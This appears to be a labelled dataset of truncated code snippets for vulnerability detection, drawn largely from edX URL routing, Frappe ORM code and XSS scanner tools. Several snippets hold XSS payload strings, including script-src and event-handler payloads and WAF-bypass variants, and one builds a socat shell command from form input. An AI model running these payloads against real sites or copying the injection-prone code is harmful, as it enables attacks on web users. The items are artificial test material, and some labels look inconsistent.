\"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring", "label": 0}, {"snippet_id": 7274, "code": "-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html", "label": 0}, {"snippet_id": 4318, "code": "/img>\" % self.url return payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ", "label": 1}, {"snippet_id": 13247, "code": "\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^", "label": 0}, {"snippet_id": 21379, "code": "(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses", "label": 1}, {"snippet_id": 30263, "code": "/5.0(Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0', \t\t'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', \t\t'Accept-Language': 'en-US,en;q=0.5', \t\t'Accept-Encoding': 'gzip", "label": 0}, {"snippet_id": 33921, "code": ".db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or", "label": 0}, {"snippet_id": 8025, "code": ")/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views", "label": 0}, {"snippet_id": 54181, "code": " sky blue').grid(row=1) Label(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light sky blue').grid(row=3) Label(main, text=\"User-Agent:\",background", "label": 0}, {"snippet_id": 54549, "code": " class Meta: model=Comment fields=['content'] class UserDetail(DetailView): model=User template_name='user.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context", "label": 0}, {"snippet_id": 1461, "code": " sys.path.append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import scan_single_api from flask", "label": 1}, {"snippet_id": 41356, "code": " get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape", "label": 0}, {"snippet_id": 9648, "code": "', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P", "label": 0}, {"snippet_id": 34947, "code": " None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t", "label": 0}, {"snippet_id": 49968, "code": " import json import re import time from twisted.web import server, resource from twisted.internet.task import LoopingCall from django.utils.functional import Promise from django.utils.encoding import force_unicode", "label": 0}, {"snippet_id": 51136, "code": ".schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc)) @staticmethod def next(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule", "label": 0}, {"snippet_id": 10862, "code": " bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers", "label": 0}, {"snippet_id": 11564, "code": ".accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P", "label": 0}, {"snippet_id": 4788, "code": ", 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s ", "label": 0}, {"snippet_id": 8436, "code": " ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view", "label": 0}, {"snippet_id": 9717, "code": " url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login'", "label": 0}, {"snippet_id": 19070, "code": ")/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT", "label": 0}, {"snippet_id": 7271, "code": ".render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render", "label": 0}, {"snippet_id": 46990, "code": "{self.id}'), ONE_HOUR) async def comment_ids_liked_by(self, user_id): cids=[c.id for c in await self.comments] if not cids: return[] queryset=await ReactItem.filter( Q(user_id=user_id), Q(target_id__in", "label": 0}, {"snippet_id": 11212, "code": "}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{", "label": 0}, {"snippet_id": 33124, "code": " import api import bq import bulkproc import config import expiration import model import notifications import service import swarming import user README_MD=( 'https://chromium.googlesource.com/infra/infra", "label": 0}, {"snippet_id": 8045, "code": ".peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),", "label": 0}, {"snippet_id": 1844, "code": "'Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode(", "label": 0}, {"snippet_id": 11145, "code": "\"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000", "label": 0}, {"snippet_id": 44469, "code": ".get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow", "label": 0}, {"snippet_id": 18910, "code": ".provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth", "label": 0}, {"snippet_id": 42131, "code": "[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df", "label": 0}, {"snippet_id": 9163, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>", "label": 1}, {"snippet_id": 25684, "code": "'required'}) else: widget=forms.CheckboxInput() if initial: initialbool=(initial.answer==\"True\") else: initialbool=False field=forms.BooleanField( label=q.question, required=q.required, help_text=help_text", "label": 1}, {"snippet_id": 5090, "code": " class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self", "label": 0}, {"snippet_id": 18955, "code": ", 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^", "label": 0}, {"snippet_id": 43626, "code": "\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname", "label": 0}, {"snippet_id": 3207, "code": "=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers", "label": 0}, {"snippet_id": 1298, "code": "'scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \"", "label": 0}, {"snippet_id": 25849, "code": ".TYPE_DATE: field=forms.DateField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None, widget=DatePickerWidget", "label": 0}, {"snippet_id": 53421, "code": ".POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'],", "label": 0}, {"snippet_id": 3828, "code": ".insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{", "label": 0}, {"snippet_id": 31601, "code": ", \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@conn\"), \t\t", "label": 0}, {"snippet_id": 39766, "code": "\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t", "label": 0}, {"snippet_id": 22027, "code": ".view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status", "label": 0}, {"snippet_id": 17860, "code": " 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=", "label": 0}, {"snippet_id": 1184, "code": "'../Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods", "label": 0}, {"snippet_id": 7600, "code": "+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted')", "label": 1}, {"snippet_id": 38348, "code": " Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, ", "label": 0}, {"snippet_id": 30700, "code": ".get_setting('haproxy_sock') \tenable=form.getvalue('servaction') \tbackend=form.getvalue('servbackend')\t \tcmd='echo \"%s %s\" |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' %(enable,", "label": 0}, {"snippet_id": 22897, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 1}, {"snippet_id": 37634, "code": ", limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions", "label": 0}, {"snippet_id": 51924, "code": " CELERY_ACKS_LATE=True TOOLS={ 'organizations':{ 'import_data_dir': '', }, } OUTPUT_DIR=os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) +'/') VENDOR_DIR=os.environ.get('VENDOR_DIR', os.path", "label": 0}, {"snippet_id": 32331, "code": ".directory)) return 1 rpath=os.path.relpath(path, top_level) url='%s/%s' %(origin, rpath) print('Opening %s' % url) thread=threading.Thread(target=_open_url, args=(url,)) thread.start() elif os.path.isfile", "label": 0}, {"snippet_id": 22737, "code": ".views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', ", "label": 0}, {"snippet_id": 14288, "code": "(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 17658, "code": ", url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$", "label": 0}, {"snippet_id": 10992, "code": "\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not", "label": 0}, {"snippet_id": 52079, "code": "(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid']=workflow_id doc=Document2.objects.get(type='oozie-workflow2', **wid)", "label": 0}, {"snippet_id": 21644, "code": "'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\")", "label": 0}, {"snippet_id": 55028, "code": "] TranslationMemoryEntry.objects.bulk_create(memory_entries) @login_required(redirect_field_name='', login_url='/403') @require_POST @require_AJAX @transaction.atomic def batch_edit_translations(request", "label": 0}, {"snippet_id": 635, "code": "'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger", "label": 1}, {"snippet_id": 7457, "code": ".modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/", "label": 0}, {"snippet_id": 1745, "code": "/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app", "label": 0}, {"snippet_id": 14061, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 47311, "code": "=True) assert res.status_code==200 res=client.get(detail_view_url) assert res.status_code==200 assert '<pre>null</pre>' in res.get_data(as_text=True) res=client.post( delete_view_url, data={'id': rec_uuid}", "label": 0}, {"snippet_id": 7055, "code": "'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url", "label": 0}, {"snippet_id": 15561, "code": " prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)", "label": 0}, {"snippet_id": 7719, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views", "label": 0}, {"snippet_id": 30682, "code": " None and act==\"showMap\": \tovw.get_map(serv) \t if form.getvalue('servaction') is not None: \tserver_state_file=sql.get_setting('server_state_file') \thaproxy_sock=sql.get_setting('haproxy_sock') \tenable=form", "label": 0}, {"snippet_id": 5934, "code": " '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"", "label": 0}, {"snippet_id": 53489, "code": ".update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status']=0 response['id']=bundle_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response", "label": 0}, {"snippet_id": 13448, "code": "'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern", "label": 0}, {"snippet_id": 46409, "code": ".create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label']) Document.objects.link(dashboard_doc, owner=request.user, name=collection", "label": 0}, {"snippet_id": 5022, "code": ")</script></html>' ] _h5payloads=[ '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input", "label": 0}, {"snippet_id": 22992, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views", "label": 0}, {"snippet_id": 47231, "code": "): item for item in menu_items['Records'].get_children()} assert 'Record Metadata' in submenu_items assert isinstance(submenu_items['Record Metadata'], menu.MenuView) rec_uuid=str(uuid.uuid4()) Record.create", "label": 1}, {"snippet_id": 9859, "code": "/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings", "label": 0}, {"snippet_id": 48572, "code": "%20primary%20reservation%20id\") srid: int=int(request.GET[\"srid\"]) sr: SubReservation=None if srid==0: sr=SubReservation() else: sr=SubReservation.objects.get(id=srid) if request.POST.get(\"notes\"): sr.notes", "label": 1}, {"snippet_id": 13490, "code": " include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/',", "label": 0}, {"snippet_id": 35648, "code": "(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: ", "label": 0}, {"snippet_id": 27299, "code": "\"The superclass of all handlers.\"\"\" from builtins import object from future import standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging", "label": 0}, {"snippet_id": 55077, "code": ") entities=Entity.objects.filter(pk__in=form.cleaned_data['entities']) if not entities.exists(): return JsonResponse({'count': 0}) projects_pk=entities.values_list('resource__project__pk', flat=True) projects", "label": 0}, {"snippet_id": 54856, "code": " class CommentDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\" model=Comment def get_success_url(self): return reverse('article-detail', kwargs={'pk': self.object.article.pk}) def test_func(self)", "label": 0}, {"snippet_id": 18676, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes", "label": 0}, {"snippet_id": 24567, "code": ": pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly:", "label": 0}, {"snippet_id": 20820, "code": "]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 3684, "code": "] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def", "label": 0}, {"snippet_id": 3950, "code": "=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact", "label": 0}, {"snippet_id": 11294, "code": "') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect", "label": 0}, {"snippet_id": 25914, "code": " initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None, widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) field", "label": 0}, {"snippet_id": 4009, "code": ", '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url==", "label": 0}, {"snippet_id": 42568, "code": ") \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname", "label": 0}, {"snippet_id": 29543, "code": "\tproc_count=0 \treturn proc_count\t\t def ssh_command(serv, commands, **kwargs): \tssh=ssh_connect(serv) \t\t \tfor command in commands: \t\ttry: \t\t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t", "label": 0}, {"snippet_id": 35086, "code": " where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in", "label": 0}, {"snippet_id": 55015, "code": ", entity=t.entity, translation=t, project=project, ) for t in( Translation.objects .filter(pk__in=changed_translation_pks) .prefetch_related('entity__resource') ) ] TranslationMemoryEntry.objects.bulk_create", "label": 0}, {"snippet_id": 14241, "code": "'ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views", "label": 0}, {"snippet_id": 10049, "code": "{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format(", "label": 0}, {"snippet_id": 31172, "code": " form.getvalue('installwaf'): \tfunct.waf_install(form.getvalue('installwaf')) \t if form.getvalue('metrics_waf'): \tsql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable')) \t\t", "label": 0}, {"snippet_id": 7166, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\"", "label": 0}, {"snippet_id": 9213, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter", "label": 1}, {"snippet_id": 31645, "code": ".add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t \t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0.5, color=' \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" ", "label": 0}, {"snippet_id": 47519, "code": "=str(profile.authuser.email))) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name', button_text=profile.displayName)) f.add_content(PlainText('DECT: ')) f.add_content", "label": 0}, {"snippet_id": 27810, "code": " status >=400 and status <=499: logging.info(json.dumps(values, cls=JsonEncoder)) del values['traceDump'] else: logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept", "label": 0}, {"snippet_id": 30607, "code": " \tfunct.show_log(output) \tprint(stderr) \t\t if form.getvalue('viewlogs') is not None: \tviewlog=form.getvalue('viewlogs') \tlog_path=funct.get_config_var('main', 'log_path') \trows=form.getvalue('rows2') \tgrep", "label": 0}, {"snippet_id": 27224, "code": " Form detected. Method \" +rtype.upper() except Exception, e: print \"[-] scan_for_forms(): Error \" +str(e) return def banner(): print \"BEstAutomaticXSSFinder v1.0\" print \"DISCLAIMER: For testing purposes", "label": 1}, {"snippet_id": 27148, "code": " has_form==1: m_input=re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I) if m_input: m_value=re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I) if m_value: hidden_param_name", "label": 1}, {"snippet_id": 611, "code": " xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri", "label": 1}, {"snippet_id": 34691, "code": " not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname", "label": 0}, {"snippet_id": 29994, "code": ".get_config_var('main', 'cert_local_dir') \tcert_path=sql.get_setting('cert_path') \t \tif not os.path.exists(cert_local_dir): \t\tos.makedirs(cert_local_dir) \t \tif form.getvalue('ssl_name') is None: \t\tprint", "label": 0}, {"snippet_id": 34974, "code": ".user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t", "label": 0}, {"snippet_id": 44112, "code": " test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS</em> exploit&lt;& \"\"", "label": 0}, {"snippet_id": 5676, "code": ":confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=/", "label": 0}, {"snippet_id": 53003, "code": " render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id'", "label": 1}, {"snippet_id": 21753, "code": " settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 40060, "code": "\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint'", "label": 0}, {"snippet_id": 55140, "code": " request.user, active_translations, locale, ) if action_status.get('error'): return JsonResponse(action_status) invalid_translation_count=len(action_status.get('invalid_translation_pks',[])) if action_status[", "label": 0}, {"snippet_id": 39194, "code": "\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self", "label": 0}, {"snippet_id": 43223, "code": "(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), 